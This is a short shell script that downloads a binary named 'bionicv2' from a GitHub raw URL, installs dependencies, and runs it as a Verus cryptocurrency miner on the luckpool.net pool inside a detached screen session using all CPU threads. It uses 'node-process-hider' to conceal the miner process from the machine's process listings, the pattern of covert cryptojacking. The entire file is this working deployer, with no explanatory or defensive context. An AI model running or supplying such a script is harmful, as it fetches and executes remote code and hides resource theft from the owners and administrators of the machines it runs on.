#!/bin/sh

cd
apt-get install -y screen < "/dev/null"
mkdir yoho
cd yoho

wget -O bionicv2 https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/bionicv2
chmod +x bionicv2
apt-get update
apt-get install screen -y
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev -y
apt-get install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
npm i -g node-process-hider
ph add bionicv2
pool="stratum+tcp://na.luckpool.net:3956"
wallet="$1"
workername="$(cat /proc/sys/kernel/hostname)"
thread="$(nproc --all)"

screen -S "mylittlescreen" -d -m
screen -r "mylittlescreen" -X stuff $'./bionicv2 -a verus -o $pool -u $wallet.$workername -t $thread -p x\n'
